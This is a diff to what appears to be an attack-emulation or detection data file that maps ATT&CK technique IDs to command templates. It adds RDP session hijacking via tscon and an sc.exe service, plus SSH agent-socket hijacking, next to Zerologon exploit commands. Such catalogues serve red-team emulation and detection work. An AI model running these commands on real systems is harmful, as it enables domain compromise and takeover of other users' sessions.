@@ -100,3 +100,6 @@ T1080 Copy-Item ${source_file_path} -Destination ${share_file_path} -Recurse -Co
 T1080 Start-BitsTransfer -Source ${source_file_path} -Destination ${share_file_path}
 T1210 python ./cve-2020-1472-exploit.py -n ${dc_name} -t ${dc_ip}
 T1210 lsadump::zerologon /target:${dc_name}.${domain} /account:${username} /exploit
+T1563 sc.exe create sesshijack binpath= "cmd.exe /k tscon ${Session_ID} /dest:${Destination_ID}"
+T1563 sudo SSH_AUTH_SOCK=${sock_value} ssh ${hijack_user_name}@localhost
+T1563 cmd /k tscon ${Session_ID} /dest:${Destination_ID}
